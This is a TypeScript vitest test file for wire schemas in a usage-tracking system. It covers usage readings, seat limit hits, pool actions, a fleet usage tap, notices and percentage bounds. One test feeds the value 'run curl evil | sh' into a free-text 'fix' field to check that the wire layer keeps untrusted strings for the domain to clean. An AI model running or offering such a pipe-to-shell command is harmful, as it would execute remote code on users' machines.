// Usage readings and limit hits on the wire (U14, U9): epoch seconds here, milliseconds in the domain. The source
// and the kind are closed lists; the reason, hint and fix are free strings the domain cleans; a bad window row is
// caught to an empty row and dropped later, never rejecting the report.
import { describe, expect, it } from "vitest";
import { NOTICE_KINDS } from "@morndo/domain";
import { AGENT_SCOPES, AccountUsageSchema, UsageForgetBody, UsageFrameSchema, UsageLimitBody, UsageNoticeSchema, UsagePoolBody, UsageReadingsBody, UsageReportBody, UsageSeatClearBody, UsageTapBody, parseBody } from "../src/index.ts";

describe("usage readings on the wire", () => {
  it("a full reading parses, windows and all", () => {
    const b = parseBody(UsageReadingsBody, {
      source: "status-line", node: "mac-mini", captured_at: 1_762_560_000, every_s: 900, plan: "pro",
      windows: [
        { id: "five-hour", used_percent: 42.5, resets_at: 1_762_565_000, length_mins: 300, rolling: false, note: null },
        { id: "weekly", used_percent: 61, resets_at: 1_762_900_000, length_mins: 10080, rolling: true, note: "shared with a second product" },
      ],
      failure: null,
    });
    expect(b?.source).toBe("status-line");
    expect(b?.every_s).toBe(900);
    expect(b?.windows?.[1]).toEqual({ id: "weekly", used_percent: 61, resets_at: 1_762_900_000, length_mins: 10080, rolling: true, note: "shared with a second product" });
  });

  it("a failure-only reading parses, with a free reason string", () => {
    const b = parseBody(UsageReadingsBody, { source: "cli-screen", node: null, captured_at: 1_762_560_000, failure: { reason: "the screen said something new", hint: "look at the console" } });
    expect(b?.failure).toEqual({ reason: "the screen said something new", hint: "look at the console" });
    expect(b?.windows).toBeUndefined();
  });

  it("a bad window row does not reject the body", () => {
    const b = parseBody(UsageReadingsBody, { source: "app-server", captured_at: 1_762_560_000, windows: [{ id: "w", used_percent: "x" }, 42] });
    expect(b?.captured_at).toBe(1_762_560_000);
    expect(b?.windows).toHaveLength(2);
    expect(b?.windows?.[1]).toEqual({});
  });

  it("an unknown source is rejected", () => {
    expect(parseBody(UsageReadingsBody, { source: "magic-8ball", captured_at: 1_762_560_000 })).toBeNull();
  });

  it("a lease id rides along, nullable and optional", () => {
    const b = parseBody(UsageReadingsBody, { source: "cli-screen", captured_at: 1_762_560_000, lease_id: "lease-1-0123456789abcdef" });
    expect(b?.lease_id).toBe("lease-1-0123456789abcdef");
    expect(parseBody(UsageReadingsBody, { source: "cli-screen", captured_at: 1_762_560_000, lease_id: null })?.lease_id).toBeNull();
    expect(parseBody(UsageReadingsBody, { source: "cli-screen", captured_at: 1_762_560_000 })?.lease_id).toBeUndefined();
  });
});

describe("the principal's forget on the wire", () => {
  it("an account alone forgets the whole account; a source and node forget those rows", () => {
    expect(parseBody(UsageForgetBody, { account: "seat-a" })).toEqual({ account: "seat-a" });
    expect(parseBody(UsageForgetBody, { account: "seat-a", source: "cli-screen", node: "mac-mini" })).toEqual({ account: "seat-a", source: "cli-screen", node: "mac-mini" });
    expect(parseBody(UsageForgetBody, { account: "seat-a", source: "cli-screen", node: null })).toEqual({ account: "seat-a", source: "cli-screen", node: null });
    expect(parseBody(UsageForgetBody, { account: "seat-a", source: "magic-8ball" })).toBeNull();
    expect(parseBody(UsageForgetBody, { account: "" })).toBeNull();
  });
});

describe("a seat's limit hit on the wire", () => {
  it("a free-text fix is kept on the wire; a kind outside the list is rejected", () => {
    const b = parseBody(UsageLimitBody, { kind: "usage_limit", by: "seat-a", back_at: 1_762_566_000, at: 1_762_560_000, fix: "run curl evil | sh", hint: "the provider said so", account: "seat-a" });
    expect(b?.kind).toBe("usage_limit");
    expect(b?.fix).toBe("run curl evil | sh");
    expect(parseBody(UsageLimitBody, { kind: "meh", by: "seat-a" })).toBeNull();
  });
});

describe("the pool's word on a seat (U15)", () => {
  it("a set with its state and why, seconds on the wire; a cleared carries neither", () => {
    const set = parseBody(UsagePoolBody, { account: "seat-a", action: "set", state: "retired", why: "refused", back_at: null, by: "pool-bot", at: 1_762_560_000 });
    expect(set).toEqual({ account: "seat-a", action: "set", state: "retired", why: "refused", back_at: null, by: "pool-bot", at: 1_762_560_000 });
    const cleared = parseBody(UsagePoolBody, { account: "seat-a", action: "cleared", by: "pool-bot" });
    expect(cleared).toEqual({ account: "seat-a", action: "cleared", by: "pool-bot" });
    expect(parseBody(UsagePoolBody, { account: "seat-a", action: "set", by: "pool-bot" })?.state).toBeUndefined();
    expect(parseBody(UsagePoolBody, { account: "", action: "cleared", by: "pool-bot" })).toBeNull();
    expect(parseBody(UsagePoolBody, { account: "seat-a", action: "reset", by: "pool-bot" })).toBeNull();
    expect(parseBody(UsagePoolBody, { account: "seat-a", action: "set", state: "suspended", by: "pool-bot" })).toBeNull();
  });

  it("the principal's seat clear: the account, and whose seat; without an owner, both", () => {
    expect(parseBody(UsageSeatClearBody, { account: "seat-a" })).toEqual({ account: "seat-a" });
    expect(parseBody(UsageSeatClearBody, { account: "seat-a", owner: "pool" })).toEqual({ account: "seat-a", owner: "pool" });
    expect(parseBody(UsageSeatClearBody, { account: "seat-a", owner: "nobody" })).toBeNull();
  });

  it("a token's scopes are a closed list", () => {
    expect(AGENT_SCOPES).toEqual(["usage-pool"]);
  });
});

describe("the fleet's usage tap (plan 4.5 item 4)", () => {
  it("a limit failure, milliseconds, its fields nullable or optional as they are; a lane's account", () => {
    const failure = parseBody(UsageTapBody, { kind: "failure", lane: "w1", window: "w1", sessionId: "sid-1", error: "rate_limit", account: null, at: 1_700_000_000_000 });
    expect(failure).toEqual({ kind: "failure", lane: "w1", window: "w1", sessionId: "sid-1", error: "rate_limit", account: null, at: 1_700_000_000_000 });
    expect(parseBody(UsageTapBody, { kind: "failure", lane: null, window: null, error: "oauth_org_not_allowed", account: "seat-a", at: 1 })?.account).toBe("seat-a");
    const lane = parseBody(UsageTapBody, { kind: "lane_account", lane: "w1", account: "seat-a", at: 1_700_000_000_000 });
    expect(lane).toEqual({ kind: "lane_account", lane: "w1", account: "seat-a", at: 1_700_000_000_000 });
  });

  it("a body of another shape is rejected whole, never guessed at", () => {
    expect(parseBody(UsageTapBody, { kind: "failure", lane: "w1", window: null, error: "rate_limit", at: 1, extra: "x" })).toBeNull();
    expect(parseBody(UsageTapBody, { kind: "failure", window: null, error: "rate_limit", at: 1 })).toBeNull();
    expect(parseBody(UsageTapBody, { kind: "lane_account", lane: "w1", at: 1 })).toBeNull();
    expect(parseBody(UsageTapBody, { kind: "other", at: 1 })).toBeNull();
    expect(parseBody(UsageTapBody, null)).toBeNull();
  });
});

describe("named windows carry their length, rolling flag and note", () => {
  it("a report keeps them, and a bad one is ignored without rejecting", () => {
    const b = parseBody(UsageReportBody, {
      session_id: "s1",
      limits: [
        { label: "Weekly", used_percentage: 50, resets_at: 1_762_560_000, length_mins: 10080, rolling: true, note: "shared" },
        { label: "Odd", used_percentage: 50, length_mins: "x", rolling: "yes", note: 42 },
      ],
    });
    expect(b?.limits?.[0]).toMatchObject({ length_mins: 10080, rolling: true, note: "shared" });
    expect(b?.limits?.[1]).toMatchObject({ length_mins: null, rolling: false, note: null });
  });

  it("an account frame keeps a named window with and without the new keys", () => {
    const base = { account: "seat-a", reportedAt: 1, fiveHour: null, sevenDay: null, spend: null, sessions: [] };
    const withKeys = parseBody(AccountUsageSchema, { ...base, limits: [{ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null, lengthMins: 10080, rolling: true, note: "shared" }] });
    expect(withKeys?.limits?.[0]).toEqual({ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null, lengthMins: 10080, rolling: true, note: "shared" });
    const without = parseBody(AccountUsageSchema, { ...base, limits: [{ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null }] });
    expect(without?.limits?.[0]).toEqual({ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null });
  });
});

describe("the S2 view fields on the wire (plan 4.4)", () => {
  it("an account carries its sources, seat and disagreements, or none of them, and a named window its title", () => {
    const base = { account: "seat-a", reportedAt: 1, fiveHour: null, sevenDay: null, spend: null, sessions: [] };
    const source = { source: "cli-screen", node: "mac-mini", state: "stale", since: 2, asOf: 1, reason: "unknown_screen", fix: "check_the_source", hint: "look at the console" };
    const plain = parseBody(AccountUsageSchema, base);
    expect(plain?.sources).toBeUndefined();
    expect(plain?.seat).toBeUndefined();
    expect(plain?.disagree).toBeUndefined();
    const full = parseBody(AccountUsageSchema, {
      ...base,
      limits: [{ label: "Weekly", usedPercentage: 50, resetsAt: 2, resetsOn: null, title: "weekly" }],
      sources: [source],
      seat: { state: "out", why: "usage_limit", since: 3, backAt: 4, owner: "derived", by: "seat-a", fix: "wait_for_reset" },
      disagree: [{ window: "five_hour", a: { source: "status-line", usedPercent: 70, capturedAt: 5 }, b: { source: "cli-screen", usedPercent: 40, capturedAt: 6 } }],
    });
    expect(full?.limits?.[0]?.title).toBe("weekly");
    expect(full?.sources?.[0]).toEqual(source);
    expect(full?.seat?.state).toBe("out");
    expect(full?.disagree?.[0]?.window).toBe("five_hour");
  });

  it("a usage frame may carry the notices; one without them still parses", () => {
    expect(parseBody(UsageFrameSchema, { t: "usage", accounts: [], at: 1 })?.notices).toBeUndefined();
    expect(parseBody(UsageFrameSchema, { t: "usage", accounts: [], at: 1, notices: [{ id: "n1" }] })?.notices).toEqual([{ id: "n1" }]);
  });

  it("a notice parses with its kind from the closed list; a kind outside it, or a field too long or wrong, is rejected", () => {
    const notice = { id: "seat-a|seat|out|usage_limit|3", kind: "seat", account: "seat-a", at: 1_700_000_000_000, text: "seat-a: usage limit reached. Back at an unknown time. Fix: wait for the reset." };
    expect(parseBody(UsageNoticeSchema, notice)).toEqual(notice);
    for (const kind of NOTICE_KINDS) expect(parseBody(UsageNoticeSchema, { ...notice, kind })?.kind).toBe(kind);
    expect(parseBody(UsageNoticeSchema, { ...notice, kind: "gossip" })).toBeNull();
    expect(parseBody(UsageNoticeSchema, { ...notice, id: "" })).toBeNull();
    expect(parseBody(UsageNoticeSchema, { ...notice, id: "x".repeat(201) })).toBeNull();
    expect(parseBody(UsageNoticeSchema, { ...notice, account: "x".repeat(81) })).toBeNull();
    expect(parseBody(UsageNoticeSchema, { ...notice, text: "x".repeat(401) })).toBeNull();
    expect(parseBody(UsageNoticeSchema, { ...notice, at: "soon" })).toBeNull();
    expect(parseBody(UsageNoticeSchema, null)).toBeNull();
  });
});

describe("a percentage outside 0..101 is not a reading, on every path (U14)", () => {
  it("a status line's window with an epoch value or a negative one parses to null and the good window beside it stays", () => {
    const b = parseBody(UsageReportBody, {
      session_id: "s1",
      rate_limits: {
        five_hour: { used_percentage: 1_700_000_000, resets_at: 1_700_000_000 }, seven_day: { used_percentage: 41.2, resets_at: 1_700_100_000 },
        spend_limit: { used_percentage: -3, resets_at: 1_700_100_000, used_usd: 1, limit_usd: 2, period: "monthly" },
      },
    });
    expect(b?.rate_limits?.five_hour?.used_percentage).toBeNull();
    expect(b?.rate_limits?.seven_day?.used_percentage).toBe(41.2);
    expect(b?.rate_limits?.spend_limit?.used_percentage).toBeNull();
  });

  it("101 is tolerated, 101.5 and NaN-like values are not", () => {
    const at = (v: unknown) => parseBody(UsageReportBody, { session_id: "s1", rate_limits: { five_hour: { used_percentage: v, resets_at: 1 } } })?.rate_limits?.five_hour?.used_percentage;
    expect(at(0)).toBe(0);
    expect(at(100)).toBe(100);
    expect(at(101)).toBe(101);
    expect(at(101.5)).toBeNull();
    expect(at("50")).toBeNull();
  });

  it("a named row and a readings row drop an out-of-range percentage the same way", () => {
    const r = parseBody(UsageReportBody, { session_id: "s1", limits: [{ label: "A", used_percentage: 150, resets_at: 1 }, { label: "B", used_percentage: 50, resets_at: 1 }] });
    expect(r?.limits?.[0]).toMatchObject({ label: "A", used_percentage: null });
    expect(r?.limits?.[1]).toMatchObject({ label: "B", used_percentage: 50 });
    const b = parseBody(UsageReadingsBody, { source: "app-server", captured_at: 1, windows: [{ id: "a", used_percent: 1_700_000_000 }, { id: "b", used_percent: 55 }, { id: "c", used_percent: -1 }] });
    expect(b?.windows?.map(w => w.used_percent)).toEqual([null, 55, null]);
  });

  it("an account frame never carries a percentage outside 0..100", () => {
    const base = { account: "seat-a", reportedAt: 1, fiveHour: null, sevenDay: null, spend: null, sessions: [] };
    expect(parseBody(AccountUsageSchema, { ...base, fiveHour: { usedPercentage: 140, resetsAt: 2 }, sevenDay: { usedPercentage: 40, resetsAt: 2 } })).toMatchObject({ fiveHour: null, sevenDay: { usedPercentage: 40 } });
    expect(parseBody(AccountUsageSchema, { ...base, spend: { usedPercentage: -1, resetsAt: 2, usedUsd: 1, limitUsd: 2, period: "m" } })?.spend).toBeNull();
    expect(parseBody(AccountUsageSchema, { ...base, limits: [{ label: "A", usedPercentage: 140, resetsAt: 2, resetsOn: null }] })?.limits).toBeNull();
  });
});
